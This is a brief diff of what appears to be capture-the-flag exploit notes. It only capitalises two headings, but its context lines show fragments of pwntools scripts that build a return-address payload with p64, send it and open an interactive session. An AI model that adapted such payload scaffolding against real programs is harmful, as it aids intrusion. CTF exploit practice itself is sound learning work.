@@ -8,7 +8,7 @@ payload += p64(0x00000000004011b6)
 io.sendline(payload)
 io.interactive()
 ```
-# ***check***
+# ***CHECK***
 
 ```
 from pwn import*
@@ -18,5 +18,5 @@ io.sendline(payload)
 io.interactive()
 ```
 
-# ***overwrite***
+# ***OVERWRITE***
 
